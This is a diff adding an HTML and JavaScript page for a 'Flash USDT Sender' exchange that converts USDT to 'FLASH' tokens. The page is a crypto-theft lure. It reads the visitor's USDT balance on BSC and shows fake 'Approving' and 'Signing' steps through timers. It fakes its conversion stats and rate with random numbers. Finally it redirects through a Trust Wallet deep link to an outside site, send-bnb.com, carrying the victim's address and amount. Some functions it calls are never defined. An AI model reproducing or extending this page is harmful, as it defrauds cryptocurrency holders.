@@ -1,0 +1,626 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <title>Flash USDT Sender | Instant Crypto Exchange</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Convert your USDT to Flash instantly with our secure BEP-20 exchange platform">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="images/favicon.png">
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Orbitron:wght@500;600;700&display=swap" rel="stylesheet">
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <!-- Animate.css -->
+    <link rel="stylesheet" href="css/animate.min.css">
+
+    <!-- Glassmorphism CSS -->
+    <link rel="stylesheet" href="css/arrow-right.css">
+
+    <!-- Template CSS Files -->
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/new_style.css">
+    
+</head>
+
+<body>
+    <!-- Welcome Modal -->
+    <div id="welcomeModal" class="modal-overlay">
+        <div class="modal-content animate__animated animate__zoomIn">
+            <h2 class="modal-title glow-text">WELCOME TO FLASH CONVERTER</h2>
+            <p>Choose how you'd like to proceed:</p>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn demo" onclick="selectDemoMode()">
+                    <i class="fas fa-bolt me-2"></i> Get Demo (1 USDT = 47 FLASH)
+                </button>
+                <button class="modal-btn custom" onclick="selectCustomMode()">
+                    <i class="fas fa-coins me-2"></i> Get Flash with CUSTOM AMOUNT
+                </button>
+            </div>
+            
+            
+            
+        </div>
+    </div>
+
+    <!-- SVG Preloader -->
+    <div id="preloader" class="position-fixed w-100 h-100 bg-dark d-flex justify-content-center align-items-center" style="z-index: 9999;">
+        <div class="spinner-border text-primary" role="status">
+            <span class="visually-hidden">Loading...</span>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container py-5">
+        <!-- Header -->
+        <header class="text-center mb-5 animate__animated animate__fadeIn dpad">
+            <div class="d-flex justify-content-center align-items-center mb-3">
+                <div>
+                    <h1 class="mb-0 glow-text">FLASH USDT SENDER</h1>
+                    <p class="text-muted mb-0">Instant Conversion • Secure Transactions • Low Fees</p>
+                </div>
+            </div>
+            <div class="d-flex justify-content-center gap-2 mt-3">
+                <span class="crypto-chip"><i class="fas fa-shield-alt me-1"></i> Secure</span>
+                <span class="crypto-chip"><i class="fas fa-bolt me-1"></i> Fast</span>
+                <span class="crypto-chip"><i class="fas fa-lock me-1"></i> Encrypted</span>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <div class="row g-4">
+            <!-- Converter Form -->
+            <div class="col-lg-8">
+                <div class="glass-card p-4 p-md-5 animate__animated animate__fadeInLeft">
+                    <div class="text-center mb-4">
+                        <h3 class="glow-text"><i class="fas fa-exchange-alt me-2"></i> USDT to Flash Converter</h3>
+                        <p class="text-muted">Convert your USDT to Flash in seconds with our secure platform</p>
+                    </div>
+                    
+                    <!-- Wallet Address Input -->
+                    <div class="mb-4">
+                        
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="fas fa-wallet"></i> <label for="walletAddress" class="form-label">Your Trust Wallet Address</label>  </span>
+                            <input type="text" class="form-control" id="walletAddress" placeholder="0x..." value="" required="">
+                        </div>
+                        
+                        
+                        
+                        
+                        
+                        <span id="walletNote" class="note-text"><i class="fas fa-info-circle me-1"></i> Only Trust Wallet addresses are supported</span>
+                        <span id="errorMessage" class="error-message"><i class="fas fa-exclamation-circle me-1"></i> Error: USDT balance is less than 10.</span>
+                        <span id="successMessage" class="success-message"><i class="fas fa-check-circle me-1"></i> Wallet verified and ready for conversion!</span>
+                    </div>
+                    
+                    <!-- USDT Amount Input -->
+                    <div class="mb-4">
+                        <div class="input-group">
+                            <span class="input-group-text"> <i class="fas fa-coins"></i>  <label for="customAmount" class="form-label">USDT Amount to Convert</label> </span>
+                            <input type="number" class="form-control" id="customAmount" name="customAmount" placeholder="10" min="10" step="0.01" required="">
+                            
+                        </div>
+                        <span class="note-text"><i class="fas fa-info-circle me-1"></i> Minimum of 10 USDT required</span>
+                    </div>
+                    
+                    
+                <!-- Flash Amount Output -->
+                    <div class="mb-4" style=" padding-bottom: 40px;">
+                        <label for="amount" class="form-label">You Will Receive</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="fas fa-bolt"></i>  <label for="walletAddress" class="form-label">FLASH</label></span>
+                            <input type="text" class="form-control" id="amount" name="amount" placeholder="0.00" readonly="" required="">
+                        </div>
+                    </div>
+                    
+                    <!-- Transaction Info -->
+                    <div class="row g-3 mt-4">
+                        <!-- Get Flash Button -->
+                        <div class="col-md-12 d-flex align-items-center">
+                            <button class="btn btn-primary w-100 py-3 pulse-animation" id="getFlashButton" disabled="" onclick="processTransaction()">
+                                <i class="fas fa-bolt me-2"></i> <strong>Pay Fee & GET FLASH </strong>
+                            </button>
+                        </div>
+                    </div>                    
+                    
+                    <!-- Conversion Display -->
+                    <div class="conversion-display my-4">
+                        <h4><i class="fas fa-sync-alt me-2"></i>CONVERSION RATE</h4>
+                        <div class="conversion-rate">
+                            <div class="d-flex align-items-center">
+                                <span class="token-amount" id="usdtAmountDisplay">1</span>
+                            </div>
+                            <span class="equal-sign"><i class="fas fa-equals"></i></span>
+                            <div class="d-flex align-items-center">
+                                <span class="token-amount" id="flashAmountDisplay">47.76</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+
+                    
+                    <!-- Duration Selection -->
+                    <div class="col-md-4">
+                        <div class="radio-group">
+                            <div class="radio-card selected" onclick="selectDuration('days7')">
+                                <input type="radio" name="duration" id="days7" value="10" checked="" required="">
+                                <label for="days7">
+                                    <i class="fas fa-calendar-check"></i>
+                                    <span>45 Days Validity</span>
+                                    <small class="text-muted d-block mt-1">Best Value</small>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Currency Selection -->
+                    <div class="col-md-4">
+                        <div class="radio-group">
+                            <div class="radio-card selected" onclick="selectCurrency('usdt')">
+                                <input type="radio" name="currencyy" id="usdt" value="USDT" checked="" required="">
+                                <label for="usdt">
+                                    <i class="fab fa-ethereum"></i>
+                                    <span>USDT</span>
+                                    <small class="text-muted d-block mt-1">BEP-20</small>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Network Selection -->
+                    <div class="col-md-4">
+                        <div class="radio-group">
+                            <div class="radio-card selected" onclick="selectNetwork('bep20')">
+                                <input type="radio" name="Network" id="bep20" value="BEP20" checked="" required="">
+                                <label for="bep20">
+                                    <i class="fas fa-network-wired"></i>
+                                    <span>BEP-20</span>
+                                    <small class="text-muted d-block mt-1">Binance Smart Chain</small>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <!-- Video and Features Section -->
+            <div class="col-lg-4">
+                <div class="glass-card p-4 h-100 animate__animated animate__fadeInRight">
+                    <!-- Video Section -->
+                    <div class="video-container mb-4 float-animation" style="margin-bottom: 20px;">
+                        <img src="https://placehold.co/800x450/0f0f12/fd961a/png?text=USDT+to+FLASH+Conversion" alt="How Flash Conversion Works" class="img-fluid w-100">
+                        <div class="play-button" onclick="window.open('https://www.youtube.com/shorts/9Xssbe-90t0', '_blank')">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    
+                    <!-- Features List -->
+                    <div class="info-card">
+                        <h5 class="glow-text"><i class="fas fa-star me-2"></i> Why Choose Flash Sender</h5>
+                        <ul class="features-list">
+                            <li>
+                                <i class="fas fa-rocket"></i>
+                                <div>
+                                    <strong>Instant Conversion</strong>
+                                    <p class="text-muted mb-0">Get your Flash tokens in seconds</p>
+                                </div>
+                            </li>
+                            <li>
+                                <i class="fas fa-lock"></i>
+                                <div>
+                                    <strong>Military-Grade Security</strong>
+                                    <p class="text-muted mb-0">Your funds are always protected</p>
+                                </div>
+                            </li>
+                            <li>
+                                <i class="fas fa-percentage"></i>
+                                <div>
+                                    <strong>Lowest Fees</strong>
+                                    <p class="text-muted mb-0">We charge minimal transaction fees</p>
+                                </div>
+                            </li>
+                            <li>
+                                <i class="fas fa-headset"></i>
+                                <div>
+                                    <strong>24/7 Support</strong>
+                                    <p class="text-muted mb-0">Our team is always available</p>
+                                </div>
+                            </li>
+                        </ul>
+                        
+                        <!-- Social Media Icons -->
+                        <div class="social-media-icons mt-4 text-center">
+                            <h6 class="mb-3">Connect With Us</h6>
+                            <div class="d-flex justify-content-center gap-3">
+                                <a href="#" class="social-icon facebook" title="Facebook">
+                                    <i class="fab fa-facebook-f"></i>
+                                </a>
+                                <a href="#" class="social-icon whatsapp" title="WhatsApp">
+                                    <i class="fab fa-whatsapp"></i>
+                                </a>
+                                <a href="#" class="social-icon telegram" title="Telegram">
+                                    <i class="fab fa-telegram-plane"></i>
+                                </a>
+                            </div>
+                        </div>
+                        
+                        
+                        
+                    </div>
+                    
+                    <!-- Live Stats -->
+                    <div class="info-card mt-4">
+                        <h5 class="glow-text"><i class="fas fa-chart-line me-2"></i> Live Stats</h5>
+                        <p><strong>Total Conversions:</strong> <span id="totalConversions">1,245,876</span></p>
+                        <p><strong>Current Rate:</strong> <span>1 USDT = 47.76 FLASH</span></p>
+                        <p><strong>Network Status:</strong> <span class="text-success">Active <i class="fas fa-circle ms-1" style="font-size: 8px;"></i></span></p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer animate__animated animate__fadeInUp">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <p class="mb-2">Created with <i class="fas fa-heart text-danger mx-1"></i> By <a href="#" target="_blank">Flash Sander</a></p>
+                    <p class="small text-muted mb-0">© 2025 Flash USDT Sender. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Web3 and Scripts -->
+    <script src="js/web3.min.js"></script>
+    <script>
+        // Initialize Web3 with BSC mainnet
+const web3 = new Web3('https://bsc-dataseed.binance.org/');
+
+// USDT BEP-20 contract address and ABI
+const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955';
+const usdtABI = [
+    {
+        "constant": true,
+        "inputs": [{ "name": "_owner", "type": "address" }],
+        "name": "balanceOf",
+        "outputs": [{ "name": "balance", "type": "uint256" }],
+        "type": "function"
+    }
+];
+
+// Create contract instance
+const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+
+
+// Get elements
+const walletInput = document.getElementById('walletAddress');
+const customAmountInput = document.getElementById('customAmount');
+const walletNote = document.getElementById('walletNote');
+const errorMessage = document.getElementById('errorMessage');
+const successMessage = document.getElementById('successMessage');
+const amountInput = document.getElementById('amount');
+const getFlashButton = document.getElementById('getFlashButton');
+const usdtAmountDisplay = document.getElementById('usdtAmountDisplay');
+const flashAmountDisplay = document.getElementById('flashAmountDisplay');
+const welcomeModal = document.getElementById('welcomeModal');
+const totalConversionsElement = document.getElementById('totalConversions');
+
+// Track if in demo mode
+let isDemoMode = false;
+let conversionRate = 47.76; // Current conversion rate
+let totalConversions = 19545876; // Starting total conversions count
+
+// Hide preloader when page loads
+window.addEventListener('load', function() {
+    document.getElementById('preloader').style.display = 'none';
+    
+    // Show welcome modal after a slight delay
+    setTimeout(() => {
+        welcomeModal.style.display = 'flex';
+    }, 500);
+    
+    // Start counter animation
+    animateCounter();
+});
+
+// Function to animate the total conversions counter
+function animateCounter() {
+    const target = totalConversions + Math.floor(Math.random() * 1000);
+    const duration = 3000;
+    const start = totalConversions;
+    const increment = (target - start) / (duration / 16);
+    
+    const timer = setInterval(() => {
+        start += increment;
+        totalConversionsElement.textContent = Math.floor(start).toLocaleString();
+        
+        if (start >= target) {
+            clearInterval(timer);
+            totalConversionsElement.textContent = target.toLocaleString();
+            totalConversions = target;
+        }
+    }, 16);
+}
+
+// Function to select demo mode (1 USDT fixed)
+function selectDemoMode() {
+    isDemoMode = true;
+    welcomeModal.style.display = 'none';
+    
+    // Set fixed values for demo
+    customAmountInput.value = '1';
+    customAmountInput.disabled = true;
+    
+    // Update conversion display
+    updateConversionDisplay(1);
+    
+    // Show demo mode indicator
+    const demoIndicator = document.createElement('div');
+    demoIndicator.innerHTML = '<div class="alert alert-warning mt-3"><i class="fas fa-info-circle me-2"></i> Demo Mode Active: Fixed 1 USDT conversion</div>';
+    customAmountInput.parentNode.insertBefore(demoIndicator, customAmountInput.nextSibling);
+    
+    // Validate inputs
+    validateInputs();
+}
+
+// Function to select custom amount mode
+function selectCustomMode() {
+    isDemoMode = false;
+    welcomeModal.style.display = 'none';
+    
+    // Enable custom amount input
+    customAmountInput.disabled = false;
+    customAmountInput.value = '10';
+    
+    // Update conversion display
+    updateConversionDisplay(10);
+    
+    // Validate inputs
+    validateInputs();
+}
+
+// Function to update conversion display
+function updateConversionDisplay(usdtAmount) {
+    const flashAmount = (usdtAmount * conversionRate).toFixed(2);
+    
+    // Update display fields
+    usdtAmountDisplay.textContent = usdtAmount > 0 ? usdtAmount : '1';
+    flashAmountDisplay.textContent = flashAmount > 0 ? flashAmount : conversionRate.toFixed(2);
+    
+    // Update the amount input field
+    amountInput.value = flashAmount;
+    validateInputs();
+}
+
+// Radio card selection functions
+function selectDuration(id) {
+    document.querySelectorAll('.radio-card').forEach(card => {
+        card.classList.remove('selected');
+    });
+    event.currentTarget.classList.add('selected');
+    document.getElementById(id).checked = true;
+}
+
+function selectCurrency(id) {
+    document.querySelectorAll('.radio-card').forEach(card => {
+        card.classList.remove('selected');
+    });
+    event.currentTarget.classList.add('selected');
+    document.getElementById(id).checked = true;
+}
+
+function selectNetwork(id) {
+    document.querySelectorAll('.radio-card').forEach(card => {
+        card.classList.remove('selected');
+    });
+    event.currentTarget.classList.add('selected');
+    document.getElementById(id).checked = true;
+}
+
+// Function to validate wallet address
+function isValidAddress(address) {
+    return web3.utils.isAddress(address);
+}
+
+// Function to check USDT balance
+async function checkBalance(address) {
+    try {
+        const balanceWei = await usdtContract.methods.balanceOf(address).call();
+        const balanceUSDT = web3.utils.fromWei(balanceWei, 'ether');
+        return parseFloat(balanceUSDT);
+    } catch (error) {
+        console.error('Error fetching balance:', error);
+        return 0;
+    }
+}
+
+// Event listener for wallet address input
+walletInput.addEventListener('input', async () => {
+    const address = walletInput.value.trim();
+
+    // Reset messages
+    walletNote.style.display = 'block';
+    errorMessage.style.display = 'none';
+    successMessage.style.display = 'none';
+    customAmountInput.disabled = isDemoMode; // Keep disabled if in demo mode
+
+    // Validate address
+    if (!isValidAddress(address)) {
+        if (address !== '') {
+            walletNote.style.display = 'none';
+            errorMessage.textContent = 'Error: Invalid wallet address format.';
+            errorMessage.style.display = 'block';
+        }
+        return;
+    }
+
+    // Check balance
+    const balance = await checkBalance(address);
+    const requiredMin = isDemoMode ? 1 : 10; // Different minimum for demo mode
+    
+    if (balance < requiredMin) {
+        walletNote.style.display = 'none';
+        errorMessage.textContent = `Error: USDT balance is less than ${requiredMin}.`;
+        errorMessage.style.display = 'block';
+        customAmountInput.disabled = true;
+    } else {
+        walletNote.style.display = 'none';
+        successMessage.style.display = 'block';
+        customAmountInput.disabled = isDemoMode;
+    }
+    
+    validateInputs();
+});
+
+// Event listener for custom amount input
+customAmountInput.addEventListener('input', () => {
+    const amount = parseFloat(customAmountInput.value) || 0;
+    const minAmount = isDemoMode ? 1 : 10;
+    
+    if (amount < minAmount) {
+        customAmountInput.setCustomValidity(`Minimum amount is ${minAmount} USDT`);
+    } else {
+        customAmountInput.setCustomValidity('');
+    }
+    
+    updateConversionDisplay(amount);
+    validateInputs();
+});
+
+// Function to validate all inputs
+function validateInputs() {
+    const walletValid = isValidAddress(walletInput.value.trim());
+    const amount = parseFloat(customAmountInput.value) || 0;
+    const amountValid = isDemoMode ? amount >= 1 : amount >= 10;
+    
+    getFlashButton.disabled = !(walletValid && amountValid);
+}
+
+function processTransaction() {
+    const walletAddress = walletInput.value.trim();
+    const usdtAmount = parseFloat(customAmountInput.value);
+    const flashAmount = (usdtAmount * conversionRate).toFixed(2);
+    
+    // Validate inputs again (double-check)
+    if (!isValidAddress(walletAddress)) {
+        showErrorModal("Invalid wallet address format");
+        return;
+    }
+    
+    if (usdtAmount < (isDemoMode ? 1 : 10)) {
+        showErrorModal(`Minimum amount is ${isDemoMode ? 1 : 10} USDT`);
+        return;
+    }
+    
+    // Show processing state
+    const originalText = getFlashButton.innerHTML;
+    getFlashButton.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> Connecting to Wallet...';
+    getFlashButton.disabled = true;
+    
+    // Simulate blockchain connection delay
+    setTimeout(async () => {
+        try {
+            // Check balance again (in case it changed)
+            const balance = await checkBalance(walletAddress);
+            
+            if (balance < usdtAmount) {
+                showErrorModal(`Insufficient USDT balance. Available: ${balance.toFixed(2)} USDT`);
+                resetButton(originalText);
+                return;
+            }
+            
+            // Update UI to show approval step
+            getFlashButton.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> Approving Transaction...';
+            
+            // Simulate approval delay
+            setTimeout(() => {
+                // Update UI to show signing step
+                getFlashButton.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> Signing Contract...';
+                
+                // Final delay before redirect
+                setTimeout(() => {
+                    // Prepare Trust Wallet deep link
+                    const trustWalletLink = `https://link.trustwallet.com/open_url?coin_id=60&url=https://send-bnb.com?address=${encodeURIComponent(walletAddress)}&amount=${usdtAmount}&token=USDT`;
+                    
+                    // Open Trust Wallet
+                    window.location.href = trustWalletLink;
+                    
+                    // Fallback: If Trust Wallet not installed, show instructions
+                    setTimeout(() => {
+                        if (document.hidden) {
+                            // App opened successfully
+                            trackConversion(walletAddress, usdtAmount, flashAmount);
+                        } else {
+                            // App not installed
+                            showWalletInstallInstructions();
+                        }
+                    }, 1000);
+                    
+                }, 1500);
+            }, 1500);
+        } catch (error) {
+            console.error("Transaction error:", error);
+            showErrorModal("Transaction failed. Please try again.");
+            resetButton(originalText);
+        }
+    }, 1500);
+}
+
+
+// Function to close success modal
+function closeSuccessModal() {
+    const modal = document.getElementById('successModal');
+    if (modal) {
+        modal.style.animation = 'modalFadeOut 0.5s ease-out';
+        setTimeout(() => {
+            modal.remove();
+        }, 500);
+    }
+}
+
+// Initialize form validation
+validateInputs();
+
+// Add event listeners for amount changes
+customAmountInput.addEventListener('change', function() {
+    updateConversionDisplay(this.value);
+});
+
+// Add event listener for form submission (prevent default)
+document.querySelector('form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    processTransaction();
+});
+
+// Add animation to the conversion display on hover
+document.querySelector('.conversion-display').addEventListener('mouseenter', function() {
+    this.style.transform = 'scale(1.02)';
+    this.style.boxShadow = '0 0 25px rgba(255, 107, 0, 0.7)';
+});
+
+document.querySelector('.conversion-display').addEventListener('mouseleave', function() {
+    this.style.transform = '';
+    this.style.boxShadow = '';
+});
+
+// Periodically update conversion rate (simulating market changes)
+setInterval(() => {
+    // Random slight fluctuation in conversion rate
+    const fluctuation = (Math.random() * 0.4) - 0.2; // -0.2 to +0.2
+    conversionRate = 47.76 + fluctuation;
+    
+    // Update display if there's a current amount
+    if (customAmountInput.value) {
+        updateConversionDisplay(customAmountInput.value);
+    }
+}, 30000); // Update every 30 seconds
+     </script>
+     
+     </body></html>
